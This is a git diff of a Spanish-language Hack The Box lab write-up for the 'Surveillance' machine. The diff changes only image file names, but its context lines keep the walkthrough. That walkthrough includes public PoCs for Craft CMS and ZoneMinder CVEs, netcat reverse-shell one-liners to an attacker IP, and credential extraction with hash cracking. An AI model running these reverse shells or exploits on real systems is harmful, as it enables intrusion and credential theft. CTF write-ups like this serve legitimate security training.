@@ -3,7 +3,7 @@ title: "Surveillance - WriteUp"
 date: Sat May 17 2025 09:45:00 GMT+0200 (Central European Summer Time)
 categories: [WriteUps, HTB, Linux]
 tags: [ctf, nmap, htb, ssh, linpeas, cve, exploit, mysql, bash, hashcat]
-image: /assets/img/htb-writeups/Pasted image 20240118195242.png
+image: /assets/img/htb-writeups/Pasted-image-20240118195242.png
 ---
 
 {% include machine-info.html
@@ -13,7 +13,7 @@ image: /assets/img/htb-writeups/Pasted image 20240118195242.png
   platform="HTB"
 %}
 
-![Surveillance](/assets/img/htb-writeups/Pasted image 20240118195242.png)
+![Surveillance](/assets/img/htb-writeups/Pasted-image-20240118195242.png)
 
 -----
 
@@ -59,17 +59,17 @@ http://surveillance.htb [200 OK] Bootstrap, Country[RESERVED][ZZ], Email[demo@su
 
 HTTP
 
-![SURVEILLANCE](/assets/img/htb-writeups/Pasted image 20240118195242.png)
+![SURVEILLANCE](/assets/img/htb-writeups/Pasted-image-20240118195242.png)
 
 Explorando el código fuente obtenemos la versión exacta de Craft CMS, en este caso es la 4.4.14
 
-![SURVEILLANCE](/assets/img/htb-writeups/Pasted image 20240118195406.png)
+![SURVEILLANCE](/assets/img/htb-writeups/Pasted-image-20240118195406.png)
 
 Vamos a buscar vulnerabilidades antes de proceder al fuzzing.
 
 Y encontramos en una página con una exploit para Metasploit la vulnerabilidad CVE-2023-41892
 
-![SURVEILLANCE](/assets/img/htb-writeups/Pasted image 20240118195546.png)
+![SURVEILLANCE](/assets/img/htb-writeups/Pasted-image-20240118195546.png)
 
 Encontramos este Poc en Python, nos lo bajamos y lo ejecutamos:
 
@@ -79,7 +79,7 @@ https://gist.github.com/to016/b796ca3275fa11b5ab9594b1522f7226
 $ python3 exploit.py http://surveillance.htb
 ```
 
-![SURVEILLANCE](/assets/img/htb-writeups/Pasted image 20240118202250.png)
+![SURVEILLANCE](/assets/img/htb-writeups/Pasted-image-20240118202250.png)
 
 Como no es una shell normal vamos a intentar enviarnos una shell más completa y volverla totalmente interactiva:
 
@@ -89,11 +89,11 @@ Nos ponemos en escucha por el puerto 4444 con NetCat y ejecutamos lo siguiente e
 $ rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.10.14.49 4444 >/tmp/f
 ```
 
-![SURVEILLANCE](/assets/img/htb-writeups/Pasted image 20240118204659.png)
+![SURVEILLANCE](/assets/img/htb-writeups/Pasted-image-20240118204659.png)
 
 Encontramos credenciales de la BBDD en el archivo .env en /var/www/html/craft
 
-![SURVEILLANCE](/assets/img/htb-writeups/Pasted image 20240118211240.png)
+![SURVEILLANCE](/assets/img/htb-writeups/Pasted-image-20240118211240.png)
 
 Apuntamos las credenciales:
 
@@ -107,7 +107,7 @@ Conectamos al servidor MySQL con las credenciales encontradas:
 $ mysql -u craftuser -p
 ```
 
-![SURVEILLANCE](/assets/img/htb-writeups/Pasted image 20240118211716.png)
+![SURVEILLANCE](/assets/img/htb-writeups/Pasted-image-20240118211716.png)
 
 Y tenemos un hash con el que poder jugar con John:
 
@@ -150,13 +150,13 @@ Hay que buscar otra vía...
 
 Seguimos buscando y encontramos un archivo de backup en formato .zip:
 
-![SURVEILLANCE](/assets/img/htb-writeups/Pasted image 20240118213430.png)
+![SURVEILLANCE](/assets/img/htb-writeups/Pasted-image-20240118213430.png)
 
 Como tenemos permisos de lectura, nos lo copiaremos a la carpeta /tmp e intentaremos descomprimirlo ahí.
 
 El archivo es un script SQL para crear la BBDD. Lo examinamos y vemos que en la tabla Users se crea el usuario _Matthew_ con credenciales cifradas.
 
-![SURVEILLANCE](/assets/img/htb-writeups/Pasted image 20240118214040.png)
+![SURVEILLANCE](/assets/img/htb-writeups/Pasted-image-20240118214040.png)
 
 ```
 Hash Matthew:
@@ -170,7 +170,7 @@ Lo copiamos a un archivo y ejecutamos _hashcat_, a ver si esta vez hay más suer
 $ hashcat -m 1400 hash /usr/share/wordlists/rockyou.txt
 ```
 
-![SURVEILLANCE](/assets/img/htb-writeups/Pasted image 20240118214621.png)
+![SURVEILLANCE](/assets/img/htb-writeups/Pasted-image-20240118214621.png)
 
 Esta vez sí hemos tenido suerte!
 
@@ -182,13 +182,13 @@ Con las credenciales obtenidas cambiamos a _Matthew_, registramos la primera ban
 
 Nos subimos linpeas y pspy a una carpeta temporal y se lo pasamos para ver qué encontramos.
 
-![SURVEILLANCE](/assets/img/htb-writeups/Pasted image 20240118215719.png)
+![SURVEILLANCE](/assets/img/htb-writeups/Pasted-image-20240118215719.png)
 
 Descubrimos que tiene un servicio web corriendo internamente por el puerto 8080, parece un proxy pero de todas formas nos lo traeremos a nuestra máquina para ver qué ofrece.
 
 Encontramos también unas credenciales:
 
-![SURVEILLANCE](/assets/img/htb-writeups/Pasted image 20240118220330.png)
+![SURVEILLANCE](/assets/img/htb-writeups/Pasted-image-20240118220330.png)
 
 ```
 public $test = array(
@@ -219,7 +219,7 @@ Ahora vamos a nuestro navegador e introducimos la URL siguiente:
 http://127.0.0.1:8080/
 ```
 
-![SURVEILLANCE](/assets/img/htb-writeups/Pasted image 20240118222348.png)
+![SURVEILLANCE](/assets/img/htb-writeups/Pasted-image-20240118222348.png)
 
 Y obtenemos una página de login. Justo antes _linpeas_ nos había encontrado unas credenciales relativas a un usuario llamado _zoneminder_ o _zm_.
 
@@ -231,7 +231,7 @@ Buscando en los archivos donde encontramos las credenciales, vemos que la versi�
 
 Encontramos el siguiente PoC para explotarlo: https://github.com/heapbytes/CVE-2023-26035
 
-![SURVEILLANCE](/assets/img/htb-writeups/Pasted image 20240118232051.png)
+![SURVEILLANCE](/assets/img/htb-writeups/Pasted-image-20240118232051.png)
 
 Nos lo bajamos y lo ejecutamos. Decir que encontrar el comando correcto para entablar la reverse shell me llevó tiempo, ya que el comando del PoC no entablaba una reverse shell.
 
@@ -241,19 +241,19 @@ $ python3 zoneminder.py --target http://127.0.0.1:8080/ --cmd 'busybox nc 10.10.
 
 Y pa dentro!
 
-![SURVEILLANCE](/assets/img/htb-writeups/Pasted image 20240119110029.png)
+![SURVEILLANCE](/assets/img/htb-writeups/Pasted-image-20240119110029.png)
 
 Vemos que podemos ejecutar como sudo un script de Perl que empiece por zm con cualquier carácter del alfabeto con extensión .pl y pasarle argumentos dentro de la carpeta /usr/bin.
 
 Vamos a ver qué archivos podemos ejecutar en esa carpeta que cumplan con esa regex:
 
-![SURVEILLANCE](/assets/img/htb-writeups/Pasted image 20240119111646.png)
+![SURVEILLANCE](/assets/img/htb-writeups/Pasted-image-20240119111646.png)
 
 La lista es muy grande y revisar archivo por archivo va a ser una tarea ardua.
 
 En el archivo _zmupdate.pl_ vemos la siguiente sintaxis:
 
-![SURVEILLANCE](/assets/img/htb-writeups/Pasted image 20240119111845.png)
+![SURVEILLANCE](/assets/img/htb-writeups/Pasted-image-20240119111845.png)
 
 Podemos pasarle un usuario y contraseña pero después de hacer algunas pruebas, no doy con la tecla, así que busco información en internet y encuentro que en el parámetro -u "dbuser" puedo pasarle una variable que apunte a un $script en bash en vez de un nombre de usuario y lo ejecutará como sudo al tener este privilegio.
 
@@ -283,7 +283,7 @@ Pulsamos intro y después escribimos "n" en la segunda pregunta.
 Y en la consola donde tenemos el NetCat escuchando recibiremos la consola de root. 
 Buen trabajo!
 
-![SURVEILLANCE](/assets/img/htb-writeups/Pasted image 20240119114650.png)
+![SURVEILLANCE](/assets/img/htb-writeups/Pasted-image-20240119114650.png)
 ---
 
 **Última actualización**: 2025-05-17<br>
